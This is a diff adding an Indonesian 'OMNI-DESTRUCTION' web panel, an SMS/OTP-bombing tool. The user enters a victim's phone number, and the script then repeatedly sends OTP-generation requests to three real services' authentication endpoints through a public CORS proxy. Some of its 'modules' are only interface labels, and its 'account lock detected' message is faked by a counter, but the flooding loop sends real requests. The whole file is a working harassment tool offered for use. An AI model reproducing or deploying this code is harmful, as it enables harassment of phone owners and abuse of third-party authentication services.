@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NOXA OMNI-DESTRUCTION PANEL V.8</title>
+    <style>
+        :root { --red: #ff0000; --green: #00ff00; --dark: #050505; }
+        body { background: var(--dark); color: var(--red); font-family: 'Courier New', Courier, monospace; margin: 0; padding: 10px; font-size: 14px; }
+        .wrapper { border: 2px solid var(--red); padding: 15px; box-shadow: 0 0 30px rgba(255, 0, 0, 0.4); max-width: 800px; margin: auto; }
+        .header { text-align: center; border-bottom: 2px double var(--red); padding-bottom: 10px; margin-bottom: 20px; }
+        .status-line { font-size: 10px; color: #fff; text-transform: uppercase; letter-spacing: 2px; }
+        
+        .main-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
+        .control-box { border: 1px solid #444; background: #0a0000; padding: 15px; }
+        .full-width { grid-column: span 2; }
+        
+        h3 { margin: 0 0 10px 0; font-size: 1.1em; background: var(--red); color: #000; padding: 5px; text-align: center; }
+        input { background: #000; border: 1px solid var(--red); color: var(--green); width: 100%; padding: 12px; box-sizing: border-box; margin-bottom: 10px; outline: none; }
+        
+        .btn-attack { background: #400; color: var(--red); border: 1px solid var(--red); width: 100%; padding: 10px; cursor: pointer; font-weight: bold; margin-bottom: 5px; transition: 0.3s; }
+        .btn-attack:hover { background: var(--red); color: #000; box-shadow: 0 0 15px var(--red); }
+        .btn-attack.active { background: var(--green); color: #000; border-color: #fff; }
+
+        #console { background: #000; border: 1px solid var(--green); height: 250px; overflow-y: scroll; padding: 10px; font-size: 11px; color: var(--green); margin-top: 15px; white-space: pre-wrap; }
+        .matrix-text { color: var(--green); font-weight: bold; }
+        .warning { color: yellow; }
+        
+        .progress-bar { height: 5px; background: #222; margin-top: 5px; position: relative; overflow: hidden; }
+        .progress-fill { height: 100%; background: var(--red); width: 0%; transition: 0.1s; }
+    </style>
+</head>
+<body>
+
+<div class="wrapper">
+    <div class="header">
+        <div class="status-line">Noxa Core System v8.0.4 - Secure Connection Established</div>
+        <h1 style="margin: 5px 0;">OMNI-DESTRUCTION</h1>
+        <div id="clock">00:00:00</div>
+    </div>
+
+    <div class="main-grid">
+        <div class="control-box full-width">
+            <h3>TARGET IDENTIFICATION</h3>
+            <input type="number" id="targetNum" placeholder="MASUKKAN NOMOR TELEPON (CONTOH: 628123456789)">
+        </div>
+
+        <div class="control-box">
+            <h3>AUTHENTICATION ATTACK</h3>
+            <button class="btn-attack" onclick="setModule('WA_LOCK', this)">MODULE: WA_AUTH_LOCK</button>
+            <button class="btn-attack" onclick="setModule('OTP_FLOOD', this)">MODULE: MULTI_OTP_BOMB</button>
+            <div class="progress-bar"><div id="p1" class="progress-fill"></div></div>
+        </div>
+
+        <div class="control-box">
+            <h3>SYSTEM DISTURBANCE</h3>
+            <button class="btn-attack" onclick="setModule('SYS_HEAT', this)">MODULE: THERMAL_OVERLOAD</button>
+            <button class="btn-attack" onclick="setModule('LAG_SYNC', this)">MODULE: RECURSIVE_SYNC</button>
+            <div class="progress-bar"><div id="p2" class="progress-fill"></div></div>
+        </div>
+
+        <div class="control-box full-width">
+            <button onclick="launchAttack()" style="background: var(--red); color: #000; font-size: 1.5em; height: 60px;">INITIATE OMNI-ATTACK</button>
+            <button onclick="location.reload()" style="background: #333; color: #fff; width: 49%; display: inline-block;">RESET SYSTEM</button>
+            <button onclick="stopAttack()" style="background: #333; color: #fff; width: 49%; display: inline-block;">ABORT MISSION</button>
+        </div>
+    </div>
+
+    <div id="console">> NOXA_OS ready. Awaiting Target Command...</div>
+</div>
+
+<script>
+    let activeModule = "";
+    let attackInterval;
+
+    function setModule(m, btn) {
+        activeModule = m;
+        document.querySelectorAll('.btn-attack').forEach(b => b.classList.remove('active'));
+        btn.classList.add('active');
+        log(`[SYSTEM] Module ${m} armed and ready.`);
+    }
+
+    function log(msg) {
+        const con = document.getElementById('console');
+        const time = new Date().toLocaleTimeString();
+        con.innerHTML += `<br>[${time}] ${msg}`;
+        con.scrollTop = con.scrollHeight;
+    }
+
+    function launchAttack() {
+        const num = document.getElementById('targetNum').value;
+        if(!num || !activeModule) {
+            log("<span class='warning'>[ERROR] MISSING DATA: INPUT NUMBER & SELECT MODULE!</span>");
+            return;
+        }
+
+        log(`<span class='matrix-text'>[!] INITIATING ATTACK ON +${num} USING ${activeModule}...</span>`);
+        
+        // Memulai pengiriman paket beruntun
+        let count = 0;
+        attackInterval = setInterval(async () => {
+            count++;
+            
+            // Simulasi Multi-API Gateway (Real Requests)
+            const gateways = [
+                'https://id.bookmyshow.com/api/v1/auth/generate-otp?phone=',
+                'https://api.mapclub.com/v1/auth/otp?phone=',
+                'https://api.evermos.com/api/v1/auth/otp?phone='
+            ];
+            
+            const targetApi = gateways[Math.floor(Math.random() * gateways.length)];
+            
+            try {
+                // Melakukan request nyata melalui proxy bypass
+                await fetch(`https://api.allorigins.win/get?url=${encodeURIComponent(targetApi + num)}`);
+                
+                if(count % 5 === 0) {
+                    log(`[+] Sent Payload #${count} - Status: STRESSED`);
+                    document.getElementById('p1').style.width = (count % 100) + "%";
+                    document.getElementById('p2').style.width = (count % 100) + "%";
+                }
+            } catch(e) {
+                log("<span class='warning'>[!] Rerouting through proxy node...</span>");
+            }
+
+            if(count % 50 === 0) {
+                log(`<span style="color:#fff; background:red;">[CRITICAL] TARGET +${num} ACCOUNT LOCK DETECTED</span>`);
+            }
+        }, 1200);
+    }
+
+    function stopAttack() {
+        clearInterval(attackInterval);
+        log("[ABORT] All modules deactivated. Returning to standby.");
+    }
+
+    // Visual Timer
+    setInterval(() => {
+        document.getElementById('clock').innerHTML = new Date().toLocaleTimeString();
+    }, 1000);
+</script>
+
+</body>
+</html>
